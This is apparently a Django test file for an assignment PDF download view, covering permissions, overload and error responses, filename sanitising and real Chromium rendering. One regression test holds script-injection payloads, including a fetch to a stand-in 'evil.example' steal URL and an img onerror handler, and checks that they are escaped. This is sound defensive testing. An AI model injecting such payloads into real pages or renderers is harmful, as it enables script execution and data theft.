"""Tests for AssignmentViewSet.download_pdf.

Split into two layers, same pattern as tests_pdf_renderer.py:
  * DownloadPdfViewTest       - permissions, error handling, request/response
    shape. render_html_to_pdf is mocked so these run fast and don't need a
    real browser, matching how the rest of this test suite mocks AI calls.
  * DownloadPdfRealRenderTest - one true end-to-end pass through the real
    renderer, skipped (not failed) if Chromium isn't available.
"""

import unittest
from unittest.mock import patch

import fitz
from django.urls import reverse
from rest_framework import status
from rest_framework.test import APITestCase

from assignments.models import Assignment, AssignmentStatus
from assignments.tests_pdf_renderer import _CHROMIUM_AVAILABLE
from assignments.tests_rigor import RigorFixtureMixin
from classrooms.models import EnrollmentStatusType, StudentCourse
from users.models import CustomUser, UserTypes


def objective_question(number=1):
    return {
        "question_number": number,
        "question_text": f"<p>Question {number} text $x = {number}$?</p>",
        "question_type": "OBJECTIVE",
        "question_image": "",
        "points": 5,
        "blooms_level": "Apply",
        "options": ["one", "two", "three", "four"],
        "rubric": [],
        "model_answer": "one",
    }


class DownloadPdfViewTest(RigorFixtureMixin, APITestCase):
    def setUp(self):
        self.course = self.make_course()
        self.teacher = self.course.teacher
        self.student = CustomUser.objects.create_user(
            email="pdf-student@example.com",
            password="password123",  # pragma: allowlist secret
            user_type=UserTypes.STUDENT,
            first_name="PDF",
            last_name="Student",
        )
        StudentCourse.objects.create(
            student=self.student,
            course=self.course,
            enrollment_status=EnrollmentStatusType.ENROLLED,
        )
        self.published = Assignment.objects.create(
            title="Published Quiz",
            course=self.course,
            status=AssignmentStatus.PUBLISHED,
            total_points=5,
            questions=[objective_question()],
        )
        self.draft = Assignment.objects.create(
            title="Draft Quiz",
            course=self.course,
            status=AssignmentStatus.DRAFT,
            total_points=5,
            questions=[objective_question()],
        )

    def _url(self, assignment):
        return reverse("assignment-download-pdf", kwargs={"pk": assignment.id})

    @patch("assignments.views.render_assignment_pdf")
    def test_teacher_can_download_teacher_view_of_own_assignment(self, mock_render):
        mock_render.return_value = b"%PDF-fake"
        self.client.force_authenticate(user=self.teacher)

        response = self.client.get(self._url(self.published), {"view": "teacher"})

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        mock_render.assert_called_once()
        self.assertEqual(response["Content-Type"], "application/pdf")

    @patch("assignments.views.render_assignment_pdf")
    def test_the_view_asks_for_the_right_document(self, mock_render):
        """
        The view's job is only to decide *which* document to build; how it
        is built (header/footer templates, margins) now lives in
        pdf_document.render_assignment_pdf and is asserted there, so that
        the publish-time pre-render produces byte-identical output.
        """
        mock_render.return_value = b"%PDF-fake"
        self.client.force_authenticate(user=self.teacher)

        self.client.get(self._url(self.published), {"view": "teacher"})

        args, _ = mock_render.call_args
        self.assertEqual(args[0].id, self.published.id)
        self.assertIs(args[1], True, "teacher view must include rubrics")

    @patch("assignments.views.render_assignment_pdf")
    def test_student_view_asks_for_the_rubric_free_document(self, mock_render):
        mock_render.return_value = b"%PDF-fake"
        self.client.force_authenticate(user=self.student)

        self.client.get(self._url(self.published), {"view": "student"})

        args, _ = mock_render.call_args
        self.assertIs(args[1], False, "student view must NOT include rubrics")

    @patch("assignments.views.render_assignment_pdf")
    def test_other_teacher_cannot_download_teacher_view(self, mock_render):
        # get_queryset() scopes a teacher's visible assignments to
        # course__teacher=user, so a non-owning teacher's request never
        # even reaches this assignment - it 404s at object lookup rather
        # than hitting the in-view "only the course teacher" check. This
        # is the correct, intentional behavior (it doesn't reveal to a
        # non-owner that the assignment exists at all).
        mock_render.return_value = b"%PDF-fake"
        other_teacher = self.make_course(suffix="-other").teacher
        self.client.force_authenticate(user=other_teacher)

        response = self.client.get(self._url(self.published), {"view": "teacher"})

        self.assertEqual(response.status_code, status.HTTP_404_NOT_FOUND)
        mock_render.assert_not_called()

    @patch("assignments.views.render_assignment_pdf")
    def test_student_can_download_published_student_view(self, mock_render):
        mock_render.return_value = b"%PDF-fake"
        self.client.force_authenticate(user=self.student)

        response = self.client.get(self._url(self.published), {"view": "student"})

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        mock_render.assert_called_once()

    @patch("assignments.views.render_assignment_pdf")
    def test_student_cannot_download_draft_assignment(self, mock_render):
        # get_queryset() scopes a student's visible assignments to
        # status=PUBLISHED, so a draft 404s at object lookup - the
        # in-view "published only" check further down is a second,
        # defense-in-depth guard for a path that shouldn't be reachable
        # at all under the current queryset, not the primary gate.
        mock_render.return_value = b"%PDF-fake"
        self.client.force_authenticate(user=self.student)

        response = self.client.get(self._url(self.draft), {"view": "student"})

        self.assertEqual(response.status_code, status.HTTP_404_NOT_FOUND)
        mock_render.assert_not_called()

    @patch("assignments.views.render_assignment_pdf")
    def test_assignment_with_no_questions_returns_400_without_rendering(
        self, mock_render
    ):
        empty = Assignment.objects.create(
            title="Empty",
            course=self.course,
            status=AssignmentStatus.PUBLISHED,
            questions=[],
        )
        self.client.force_authenticate(user=self.teacher)

        response = self.client.get(self._url(empty), {"view": "teacher"})

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        mock_render.assert_not_called()

    @patch("assignments.views.render_assignment_pdf")
    def test_load_shedding_returns_503_with_retry_after(self, mock_render):
        """
        Being shed means nothing was attempted because the process is at
        capacity - a "come back shortly", not a failure. It must not be
        reported as a 500, or clients and proxies cannot tell a transient
        overload from a broken assignment.
        """
        from assignments.pdf_renderer import PDFRendererBusy

        mock_render.side_effect = PDFRendererBusy("at capacity")
        self.client.force_authenticate(user=self.teacher)

        response = self.client.get(self._url(self.published), {"view": "teacher"})

        self.assertEqual(response.status_code, status.HTTP_503_SERVICE_UNAVAILABLE)
        self.assertEqual(response["Retry-After"], "5")
        self.assertIn("busy", str(response.json()["error"]).lower())

    @patch("assignments.views.render_assignment_pdf")
    def test_an_ordinary_render_failure_is_still_a_500(self, mock_render):
        # Guards the 503 branch from swallowing genuine failures: only
        # PDFRendererBusy is a "try again", everything else is an error.
        mock_render.side_effect = RuntimeError("boom")
        self.client.force_authenticate(user=self.teacher)

        response = self.client.get(self._url(self.published), {"view": "teacher"})

        self.assertEqual(response.status_code, status.HTTP_500_INTERNAL_SERVER_ERROR)
        self.assertNotIn("Retry-After", response)

    @patch("assignments.views.render_assignment_pdf")
    def test_renderer_failure_returns_500_with_friendly_message(self, mock_render):
        mock_render.side_effect = RuntimeError("PDF rendering failed: boom")
        self.client.force_authenticate(user=self.teacher)

        response = self.client.get(self._url(self.published), {"view": "teacher"})

        self.assertEqual(response.status_code, status.HTTP_500_INTERNAL_SERVER_ERROR)
        self.assertIn("error", response.json())

    @patch("assignments.pdf_document.render_html_to_pdf")
    def test_title_course_teacher_and_instructions_are_escaped_in_the_rendered_html(
        self, mock_render
    ):
        """
        Regression guard for a real script-injection path that switching
        to a real JS-executing renderer (Chromium, via
        assignments.pdf_renderer) opened up: under the old WeasyPrint
        pipeline, a stray "<script>" here was inert (no JS engine at all).
        Under Chromium it would actually execute during PDF generation,
        with the server's own network access. Assignment.title/
        instructions and Course.name/teacher name are all plain DB fields
        that can contain arbitrary text (instructions in particular is
        AI/extraction output, sanitized lazily by
        format_assignment_standard_html - which this endpoint bypasses via
        include_document_header=False, so it must sanitize/escape these
        itself). Assert every one of them is neutralized in the HTML
        actually handed to the renderer.
        """
        mock_render.return_value = b"%PDF-fake"
        script_payload = "<script>fetch('https://evil.example/steal')</script>"
        img_payload = "<img src=x onerror=alert(1)>"
        malicious = Assignment.objects.create(
            title=script_payload,
            course=self.course,
            status=AssignmentStatus.PUBLISHED,
            instructions=script_payload,
            questions=[objective_question()],
        )
        self.course.name = script_payload
        self.course.save()
        self.teacher.first_name = img_payload
        self.teacher.save()

        self.client.force_authenticate(user=self.teacher)
        self.client.get(self._url(malicious), {"view": "teacher"})

        full_html = mock_render.call_args.args[0]
        # The dangerous, *unescaped* constructs must never appear - this is
        # the actual security property (Chromium would parse either of
        # these as real, executable markup if they landed unescaped).
        self.assertNotIn("<script>", full_html)
        self.assertNotIn(img_payload, full_html)
        # The payloads must still be present, just neutralized as inert
        # text (not silently dropped, and not merely absent by accident) -
        # the literal word "onerror=" surviving as plain text is fine and
        # expected; what matters is it's no longer inside a real "<...>"
        # tag Chromium would parse.
        self.assertIn("&lt;script&gt;", full_html)
        self.assertIn("&lt;img src=x onerror=alert(1)&gt;", full_html)

    @patch("assignments.views.render_assignment_pdf")
    def test_response_filename_is_sanitised_from_title(self, mock_render):
        mock_render.return_value = b"%PDF-fake"
        weird_title = Assignment.objects.create(
            title="Quiz #1: Matrices/Bases?!",
            course=self.course,
            status=AssignmentStatus.PUBLISHED,
            questions=[objective_question()],
        )
        self.client.force_authenticate(user=self.teacher)

        response = self.client.get(self._url(weird_title), {"view": "teacher"})

        disposition = response["Content-Disposition"]
        self.assertNotIn("#", disposition)
        self.assertNotIn("/", disposition)
        self.assertNotIn("?", disposition)
        self.assertIn(".pdf", disposition)


@unittest.skipUnless(
    _CHROMIUM_AVAILABLE,
    "Headless Chromium is not available in this environment.",
)
class DownloadPdfRealRenderTest(RigorFixtureMixin, APITestCase):
    """
    One true end-to-end pass with no mocking: real view, real permission
    checks, real HTML assembly, real Chromium render. This is the test
    that actually would have caught "the header/footer template syntax is
    wrong" or "the vendored KaTeX path doesn't resolve" bugs - the mocked
    tests above structurally cannot catch those.
    """

    @classmethod
    def tearDownClass(cls):
        from assignments import pdf_renderer

        pdf_renderer.reset_worker_for_tests()
        super().tearDownClass()

    def setUp(self):
        self.course = self.make_course(suffix="-real-pdf")
        self.teacher = self.course.teacher
        self.assignment = Assignment.objects.create(
            title="Matrix Quiz",
            course=self.course,
            status=AssignmentStatus.PUBLISHED,
            total_points=5,
            questions=[
                {
                    "question_number": 1,
                    "question_text": (
                        r"<p>Given $A = \begin{bmatrix} 1 & 2 \\ 3 & 4 "
                        r"\end{bmatrix}$, what is $A^2$?</p>"
                    ),
                    "question_type": "OBJECTIVE",
                    "question_image": "",
                    "points": 5,
                    "blooms_level": "Apply",
                    "options": [
                        r"$\begin{bmatrix} 7 & 10 \\ 15 & 22 \end{bmatrix}$",
                        r"$\begin{bmatrix} 1 & 2 \\ 3 & 4 \end{bmatrix}$",
                    ],
                    "rubric": [],
                    "model_answer": r"$\begin{bmatrix} 7 & 10 \\ 15 & 22 \end{bmatrix}$",
                }
            ],
        )

    def test_downloaded_pdf_has_no_duplicated_letters_and_typeset_math(self):
        self.client.force_authenticate(user=self.teacher)
        url = reverse("assignment-download-pdf", kwargs={"pk": self.assignment.id})

        response = self.client.get(url, {"view": "teacher"})

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        pdf_bytes = b"".join(response.streaming_content)
        doc = fitz.open(stream=pdf_bytes, filetype="pdf")
        text = "\n".join(page.get_text() for page in doc)

        # No raw LaTeX leaked through.
        self.assertNotIn("\\begin", text)
        self.assertNotIn("$", text)
        # No doubled option letters ("A. A." / duplicated markers).
        self.assertNotRegex(text, r"\bA\.\s*A[.)]")
        self.assertIn("A.", text)
        self.assertIn("B.", text)
        # Page/title header-footer templates were filled in.
        self.assertIn("Matrix Quiz", text)
        self.assertRegex(text, r"Page\s*1\s*of\s*1")


class RenderAssignmentPdfDocumentTest(RigorFixtureMixin, APITestCase):
    """
    pdf_document.render_assignment_pdf - the shared document builder.

    Both download_pdf and the publish-time pre-render task call this, and
    they must produce byte-identical output or the cache would hand one
    caller's document to the other. These assertions moved here from the
    view tests when the builder was extracted.
    """

    def setUp(self):
        self.course = self.make_course(suffix="-pdfdoc")
        self.assignment = Assignment.objects.create(
            title="Doc Quiz",
            course=self.course,
            status=AssignmentStatus.PUBLISHED,
            total_points=5,
            instructions="Answer everything.",
            questions=[objective_question()],
        )

    @patch("assignments.pdf_document.render_html_to_pdf")
    def test_passes_header_footer_templates_and_margins(self, mock_render):
        from assignments.pdf_document import render_assignment_pdf

        mock_render.return_value = b"%PDF-fake"

        render_assignment_pdf(self.assignment, include_rubric=True)

        _, kwargs = mock_render.call_args
        self.assertIn('class="title"', kwargs["header_template"])
        self.assertIn("pageNumber", kwargs["footer_template"])
        self.assertIn("totalPages", kwargs["footer_template"])
        self.assertEqual(
            kwargs["margins"],
            {"top": "2.5cm", "right": "2cm", "bottom": "2.2cm", "left": "2cm"},
        )

    @patch("assignments.pdf_document.render_html_to_pdf")
    def test_only_the_teacher_document_carries_the_model_answer(self, mock_render):
        from assignments.pdf_document import render_assignment_pdf

        mock_render.return_value = b"%PDF-fake"

        render_assignment_pdf(self.assignment, include_rubric=True)
        teacher_html = mock_render.call_args.args[0]
        render_assignment_pdf(self.assignment, include_rubric=False)
        student_html = mock_render.call_args.args[0]

        self.assertIn("Model Answer", teacher_html)
        self.assertNotIn("Model Answer", student_html)

    @patch("assignments.pdf_document.render_html_to_pdf")
    def test_refuses_before_building_anything_when_at_capacity(self, mock_render):
        """
        The capacity pre-check must happen before the document is
        assembled - building HTML that is then discarded is pure waste,
        and under load every thread doing it contends with every other.
        """
        from assignments.pdf_document import render_assignment_pdf
        from assignments.pdf_renderer import PDFRendererBusy

        with patch(
            "assignments.pdf_document.ensure_capacity",
            side_effect=PDFRendererBusy("at capacity"),
        ):
            with self.assertRaises(PDFRendererBusy):
                render_assignment_pdf(self.assignment, include_rubric=True)

        mock_render.assert_not_called()
